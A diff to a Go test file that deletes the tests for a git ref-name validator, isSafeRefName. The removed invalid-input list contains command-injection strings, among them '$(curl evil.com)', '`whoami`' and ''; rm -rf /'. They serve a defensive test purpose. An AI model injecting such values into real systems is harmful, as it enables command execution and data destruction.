@@ -1,7 +1,6 @@
 package stats
 
 import (
-	"strings"
 	"testing"
 )
 
@@ -69,38 +68,6 @@ func TestValidateAuthor_Invalid(t *testing.T) {
 	for _, a := range authors {
 		if err := ValidateAuthor(a); err == nil {
 			t.Errorf("ValidateAuthor(%s) should have returned error", a)
-		}
-	}
-}
-
-func TestIsSafeRefName_Valid(t *testing.T) {
-	refs := []string{
-		"main",
-		"feature/my-feature",
-		"release/v1.0.0",
-		"hotfix/bug-123_fix",
-		"develop",
-	}
-	for _, r := range refs {
-		if !isSafeRefName(r) {
-			t.Errorf("isSafeRefName(%s) = false, want true", r)
-		}
-	}
-}
-
-func TestIsSafeRefName_Invalid(t *testing.T) {
-	refs := []string{
-		"",
-		strings.Repeat("a", 300),
-		"$(curl evil.com)",
-		"`whoami`",
-		"'; rm -rf /",
-		"\n",
-		"\t",
-	}
-	for _, r := range refs {
-		if isSafeRefName(r) {
-			t.Errorf("isSafeRefName(%s) = true, want false", r)
 		}
 	}
 }
